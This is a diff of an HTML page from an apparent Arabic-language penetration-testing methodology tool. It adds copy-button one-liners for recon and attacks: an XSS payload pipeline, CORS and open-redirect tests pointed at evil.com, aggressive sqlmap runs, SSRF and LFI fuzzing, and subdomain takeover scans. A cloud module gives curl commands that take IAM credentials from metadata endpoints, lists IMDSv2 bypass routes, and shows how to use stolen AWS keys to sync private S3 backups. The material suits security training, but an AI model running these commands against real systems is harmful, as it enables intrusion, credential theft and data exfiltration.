+                <button onclick="copyOneLiner(this)" data-cmd="subfinder -d target.com -all -silent | assetfinder --subs-only | sort -u | httpx -silent -sc -title -td -o alive_subs.txt" style="background:#00e5ff; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
               </div>
-              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem;">subfinder -d target.com -all -silent | httpx -silent -sc -title -td -o alive_subs.txt</code>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">subfinder -d target.com -all -silent | assetfinder --subs-only | sort -u | httpx -silent -sc -title -td -o alive_subs.txt</code>
             </div>
 
-            <div style="background:#090d16; padding:10px; border-radius:6px; border-left:3px solid #00ff66;">
-              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
-                <span style="color:#00ff66; font-weight:bold; font-size:0.85rem;">2. Extract JS Files & Secrets Hunter:</span>
-                <button onclick="copyOneLiner(this)" data-cmd="katana -u alive_subs.txt -jc -silent | grep '\.js$' | httpx -sr -srd js_out" style="background:#00ff66; color:#000; border:none; padding:2px 6px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.7rem;">Copy</button>
+            <!-- 2 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #00ff66;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#00ff66; font-weight:bold; font-size:0.85rem;">2. JS File Collector & API Keys / Secrets Hunter</span>
+                <button onclick="copyOneLiner(this)" data-cmd="katana -u alive_subs.txt -jc -silent | grep '\.js$' | httpx -sr -srd js_out -silent && rg -i '(api_key|secret|password|bearer|aws)' js_out/" style="background:#00ff66; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
               </div>
-              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem;">katana -u alive_subs.txt -jc -silent | grep '\.js$' | httpx -sr -srd js_out</code>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">katana -u alive_subs.txt -jc -silent | grep '\.js$' | httpx -sr -srd js_out -silent && rg -i '(api_key|secret|password|bearer|aws)' js_out/</code>
+            </div>
+
+            <!-- 3 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #f97316;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#f97316; font-weight:bold; font-size:0.85rem;">3. Wayback Endpoints & Automated XSS Scanner</span>
+                <button onclick="copyOneLiner(this)" data-cmd="waybackurls target.com | gf xss | grep '=' | qsreplace '&quot;&gt;&lt;script&gt;confirm(1)&lt;/script&gt;' | dalfox pipe" style="background:#f97316; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">waybackurls target.com | gf xss | grep '=' | qsreplace '"&gt;&lt;script&gt;confirm(1)&lt;/script&gt;' | dalfox pipe</code>
+            </div>
+
+            <!-- 4 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #a855f7;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#a855f7; font-weight:bold; font-size:0.85rem;">4. Hidden Parameter Discovery & Fuzzing Pipeline</span>
+                <button onclick="copyOneLiner(this)" data-cmd="arjun -u https://target.com/endpoint -m GET,POST --passive -oJ params.json" style="background:#a855f7; color:#fff; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">arjun -u https://target.com/endpoint -m GET,POST --passive -oJ params.json</code>
+            </div>
+
+            <!-- 5 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #ef4444;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#ef4444; font-weight:bold; font-size:0.85rem;">5. Mass CORS Misconfiguration Checker</span>
+                <button onclick="copyOneLiner(this)" data-cmd="cat alive_subs.txt | CORStest" style="background:#ef4444; color:#fff; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">cat alive_subs.txt | httpx -silent -H "Origin: https://evil.com" -rs -m "Access-Control-Allow-Origin: https://evil.com"</code>
+            </div>
+
+            <!-- 6 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #eab308;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#eab308; font-weight:bold; font-size:0.85rem;">6. SQLi Candidate URL Extractor & SQLMap Fuzzer</span>
+                <button onclick="copyOneLiner(this)" data-cmd="waybackurls target.com | gf sqli | sqlmap --batch --risk=3 --level=5 --random-agent" style="background:#eab308; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">waybackurls target.com | gf sqli | grep '=' | sqlmap --batch --risk=2 --level=2 --random-agent -o</code>
+            </div>
+
+            <!-- 7 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #00e5ff;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#00e5ff; font-weight:bold; font-size:0.85rem;">7. SSRF Candidate Extractor & Nuclei OAST Scanner</span>
+                <button onclick="copyOneLiner(this)" data-cmd="waybackurls target.com | gf ssrf | nuclei -t ssrf/ -iserver https://oast.pro" style="background:#00e5ff; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">waybackurls target.com | gf ssrf | grep '=' | nuclei -t ssrf/ -iserver https://oast.pro -o ssrf_results.txt</code>
+            </div>
+
+            <!-- 8 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #00ff66;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#00ff66; font-weight:bold; font-size:0.85rem;">8. LFI Parameter Fuzzer with FFUF</span>
+                <button onclick="copyOneLiner(this)" data-cmd="ffuf -u 'https://target.com/view.php?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr 'root:x:0:0'" style="background:#00ff66; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">ffuf -u 'https://target.com/view.php?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr 'root:x:0:0'</code>
+            </div>
+
+            <!-- 9 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #f97316;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#f97316; font-weight:bold; font-size:0.85rem;">9. Open Redirect Bulk Tester (Oralyzer)</span>
+                <button onclick="copyOneLiner(this)" data-cmd="waybackurls target.com | gf redirect | grep '=' | qsreplace 'https://evil.com' | httpx -silent -fr -location" style="background:#f97316; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">waybackurls target.com | gf redirect | grep '=' | qsreplace 'https://evil.com' | httpx -silent -fr -location -m "evil.com"</code>
+            </div>
+
+            <!-- 10 -->
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #a855f7;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                <span style="color:#a855f7; font-weight:bold; font-size:0.85rem;">10. Subdomain Takeover Mass Scanner</span>
+                <button onclick="copyOneLiner(this)" data-cmd="subfinder -d target.com -silent | nuclei -t takeovers/ -o takeovers.txt" style="background:#a855f7; color:#fff; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem; display:block; background:#040914; padding:8px; border-radius:4px;">subfinder -d target.com -silent | nuclei -t takeovers/ -o takeovers.txt</code>
             </div>
           </div>
         </div>
       </div>
+
 
 
       <!-- ═══════════════════════════════════════════════════════════
            MODULE: Cloud Metadata & IMDSv2
       ═══════════════════════════════════════════════════════════ -->
       <div class="meth-content-view" id="meth-content-cloud_metadata" style="display: none; --tool-color: #a855f7;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">☁️</span> Cloud Metadata & IMDSv2 Exploitation</h2>
-          <p class="hero-tagline">دليل سحب التوكنات ومفاتيح الـ IAM من بيئات AWS و Azure و GCP عبر ثغرات الـ SSRF</p>
+        <div class="phase-module-header">
+          <div class="icon-wrapper">☁️</div>
+          <div class="header-text">
+            <h2>Cloud Metadata & IMDSv2 Exploitation — الدليل الشامل</h2>
+            <p>سحب توكنات الـ IAM ومفاتيح الصلاحيات من بيئات Cloud (AWS, Azure, GCP, DigitalOcean) عبر ثغرات الـ SSRF وتجاوز حمايات IMDSv2.</p>
+          </div>
         </div>
 
+        <!-- ━━━ METADATA ENDPOINTS MATRIX ━━━ -->
+        <div class="cyber-card" style="border-left:4px solid #a855f7;">
+          <div class="card-header"><h3>🗺️ جدول الـ Metadata Endpoints لجميع مزودي السحاب</h3></div>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr><th>ميكانيكية السحاب (Provider)</th><th>العنوان (IP / Endpoint)</th><th>الترويسة المطلوبة (Header)</th><th>الهدف الحساس (Sensitive Path)</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>AWS EC2 (IMDSv1)</strong></td>
+                <td><code>http://169.254.169.254/</code></td>
+                <td>لا يوجد</td>
+                <td><code>/latest/meta-data/iam/security-credentials/[role]</code></td>
+              </tr>
+              <tr>
+                <td><strong>AWS EC2 (IMDSv2)</strong></td>
+                <td><code>http://169.254.169.254/</code></td>
+                <td><code>X-aws-ec2-metadata-token: [token]</code></td>
+                <td>يتطلب طلب PUT للحصول على التوكن أولاً</td>
+              </tr>
+              <tr>
+                <td><strong>AWS ECS / Fargate</strong></td>
+                <td><code>http://169.254.170.2/</code></td>
+                <td>لا يوجد</td>
+                <td><code>/v2/credentials/[task-id]</code></td>
+              </tr>
+              <tr>
+                <td><strong>GCP (Google Cloud)</strong></td>
+                <td><code>http://metadata.google.internal/</code></td>
+                <td><code>Metadata-Flavor: Google</code></td>
+                <td><code>/computeMetadata/v1/instance/service-accounts/default/token</code></td>
+              </tr>
+              <tr>
+                <td><strong>Azure VM</strong></td>
+                <td><code>http://169.254.169.254/</code></td>
+                <td><code>Metadata: true</code></td>
+                <td><code>/metadata/instance?api-version=2021-02-01</code></td>
+              </tr>
+              <tr>
+                <td><strong>DigitalOcean</strong></td>
+                <td><code>http://169.254.169.254/</code></td>
+                <td>لا يوجد</td>
+                <td><code>/metadata/v1/user-data</code> (Passwords & Keys!)</td>
+              </tr>
+            </tbody>
+          </table></div>
+        </div>
+
+        <!-- ━━━ AWS IMDSv1 vs IMDSv2 ━━━ -->
         <div class="cyber-card">
-          <div class="card-header"><h3>☁️ AWS EC2 Metadata (IMDSv1 & IMDSv2)</h3></div>
-          <div class="cmd-block">
-            <pre><code># AWS IMDSv2 Token Request
-TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
-curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name</code></pre>
+          <div class="card-header"><h3>⚡ AWS IMDSv1 vs IMDSv2 — كيف تعمل وكيف تنفذ الاستغلال؟</h3></div>
+
+          <div style="margin-bottom:20px;">
+            <div style="color:#00ff66;font-weight:bold;margin-bottom:8px;">🔥 AWS IMDSv1 (الاستغلال المباشر)</div>
+            <div style="background:#090d16;padding:12px;border-radius:6px;border-left:3px solid #00ff66;font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;"># Step 1: معرفة اسم الـ IAM Role</div>
+              <div>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</div>
+              <div style="color:#94a3b8;margin-top:6px;"># Output: admin-role</div>
+              <div style="color:#94a3b8;margin-top:6px;"># Step 2: قراءة التوكنات ومفاتيح الوصول</div>
+              <div>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</div>
+              <div style="color:#94a3b8;margin-top:6px;"># Response (JSON):</div>
+              <div style="color:#00e5ff;">{</div>
+              <div style="color:#00e5ff;">&nbsp;&nbsp;"AccessKeyId": "AKIA...",</div>
+              <div style="color:#00e5ff;">&nbsp;&nbsp;"SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",</div>
+              <div style="color:#00e5ff;">&nbsp;&nbsp;"Token": "IQoJb3JpZ2luX2Vj..."</div>
+              <div style="color:#00e5ff;">}</div>
+            </div>
+          </div>
+
+          <div>
+            <div style="color:#ff3366;font-weight:bold;margin-bottom:8px;">🔒 AWS IMDSv2 (يتطلب PUT Token)</div>
+            <div style="background:#090d16;padding:12px;border-radius:6px;border-left:3px solid #ff3366;font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;"># Step 1: طلب Token بـ PUT Request</div>
+              <div>TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`</div>
+              <div style="color:#94a3b8;margin-top:6px;"># Step 2: استخدام الـ Token لقراءة البيانات</div>
+              <div>curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</div>
+              <div style="color:#94a3b8;margin-top:8px;">⚠️ كيفية تجاوز IMDSv2؟</div>
+              <div style="color:#e2e8f0;">1. إيجاد ثغرة Header Injection في الـ SSRF لإرسال الترويسة.<br>2. إيجاد ثغرة RCE محلية (حيث تنجح أوامر cURL مباشرة).<br>3. فحص بيئات AWS ECS/Fargate عبر http://169.254.170.2/ التي تنفذ بدون IMDSv2.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ━━━ POST EXPLOITATION WITH AWS CLI ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>🚀 Post-Exploitation: كيف تستخدم التوكنات المسروقة؟</h3></div>
+          <div style="background:#050a14;padding:15px;border-radius:8px;font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.9;">
+            <div style="color:#94a3b8;"># Step 1: ضبط المفاتيح والسيشن في جهازك</div>
+            <div>export AWS_ACCESS_KEY_ID="AKIA..."</div>
+            <div>export AWS_SECRET_ACCESS_KEY="wJalr..."</div>
+            <div>export AWS_SESSION_TOKEN="IQoJb3Jp..."</div>
+            <div style="color:#94a3b8;margin-top:8px;"># Step 2: التحقق من هويتك في AWS</div>
+            <div>aws sts get-caller-identity</div>
+            <div style="color:#94a3b8;margin-top:8px;"># Step 3: استكشاف الـ S3 Buckets</div>
+            <div>aws s3 ls</div>
+            <div style="color:#94a3b8;margin-top:8px;"># Step 4: تحميل قروض قاعدة البيانات أو النسخ الاحتياطية</div>
+            <div>aws s3 sync s3://company-private-backups/ ./backups/</div>
           </div>
         </div>
       </div>
+
 
     </div> <!-- end meth-viewer -->
   </div> <!-- end methodology-app -->
